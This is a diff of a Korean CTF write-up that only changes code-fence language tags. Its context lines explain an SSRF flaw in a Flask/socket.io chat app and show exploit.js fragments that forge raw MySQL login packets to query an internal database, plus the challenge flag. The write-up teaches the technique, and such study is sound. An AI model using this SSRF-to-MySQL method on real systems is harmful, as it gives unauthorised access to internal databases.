@@ -135,7 +135,7 @@ Date: Thu, 12 Aug 2021 10:40:43 GMT
 - 외부망과 내부망은 서로 socket을 가지고 통신을한다. 이때 사용하는 socket은 세션을 유지하기 위해 외부망 flask의`users`라는 dict에 각 session의 uuid를 key로하여 메모리내에서 관리한다.
 
 
-```
+```py
 # ext_app/app.py
 def sessionCheck(loginCheck=False): 
  ...
@@ -151,7 +151,7 @@ def sessionCheck(loginCheck=False):
 - 이러한 세션은 각 페이지 접근 시`sessionCheck`함수를 통해 현재 세션을 가지고 있는지를 체크, 세션을 가지고 있지 않다면`session['host']`에`172.22.0.4:9091(내부망)`를 저장하고, 이를통해 socket을 연결한다.
 
 
-```
+```py
 # ext_app/app.py
 @socket_io.on("join")
 def join(content):
@@ -182,7 +182,7 @@ def join(content):
 - 하지만 socket.io가 "join"으로 emit할때, client에서 요청하는 파라미터 중`chatserver`라는 파라미터가 있을 시, 해당 파라미터를 통하여`session["host"]`를 재설정하고, 이를 토대로 다시 socket connection을 맺는다.
 
 
-```
+```js
 /* exploit.js */
 var sock = io.connect(`ws://52.78.132.206:9090/`);
 sock.on('connect', function(){
@@ -195,7 +195,7 @@ sock.on('connect', function(){
 - 따라서 위와같이`join`namespace에 emit할 때 요청되는 파라미터 중`chatserver`파라미터를 통해 임의 호스트와 포트에 raw packet을 송신할 수 있는 SSRF 취약점이 발생하게 된다.
 
 
-```
+```py
 # int_app/app.py
 class mysqlapi:
  def __init__(self):
@@ -212,7 +212,7 @@ class mysqlapi:
 - 내부망 app.py에는 db connection을 맺는 정보가 나와있다. 따라서 mysql client가 mysql server와 맺는 connection 과정을 그대로 맺은 후 query를 전송하면 전송된 query의 결과를 돌려줄 것이다.
 
 
-```
+```py
 # ext_app/app.py
 @socket_io.on("chatsend")
 def chatsend(content):
@@ -291,7 +291,7 @@ SHA1( password ) XOR SHA1( "20-bytes random data from server(seed)" + SHA1( SHA1
 - 다만 현재 socket을 통해 데이터를 주고받는 과정이 send->recv->send->recv 와 같이 1:1로만 주고받고 있기 때문에, 1번단계에서 login request를 보내더라도 첫 recv에선 connection시 서버가 전송하는 server greeting 패킷이 수신되게 된다.
 - 따라서 server seed를 받아오기 위해선 send 이후 recv가 두번 실행되어야 하는데, 이를 이루기 위하여 위에서 설명한`하나의 패킷을 두개로 쪼개 전송("AA","AA")하는`방법을 사용한다.
 
-```
+```js
 function step1(){
 // step 1
 //b'\xcb\x00\x00\x01\x8d\xa2\xbf\t\x00\x00\x00\x01\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00chatdb_admin\x00\x00chatdb\x00caching_sha2_password\x00t\x04_pid\x0516419\t_platform\x06x86_64\x03_os\x05Linux\x0c_client_name\x08libmysql\x07os_user\x05arang\x0f_client_version\x068.0.23\x0cprogram_name\x05sendtome'
@@ -308,7 +308,7 @@ setTimeout(function(){console.log("send 2 round");sock.emit("chatsend", "sendtom
 - mysql raw packet의 맨 앞 3바이트는 뒤에 올 패킷의 length인데, 이를 적절히 변조하여 마지막 sendtome 8byte만 빼고 보냄으로써`TCP segment of a reassembled PDU`를 유도하고, send -> recv -> (send, 원래 첫번째패킷) -> recv가 되도록 만들어준다.
 
 
-```
+```js
 async function step2(serverSeed){ 
  //// mysql native password hashing process
  // SHA1( password ) XOR SHA1( "20-bytes random data from server" <concat> SHA1( SHA1( password ) ) )
@@ -351,7 +351,7 @@ async function step2(serverSeed){
 **마지막 플래그fiesta{mysql_int3rner_1s_s0_fun_isnt_1t?}**
 
 
-```
+```js
 // author(arang)'s writeup
 
 function ab2str(buf) {
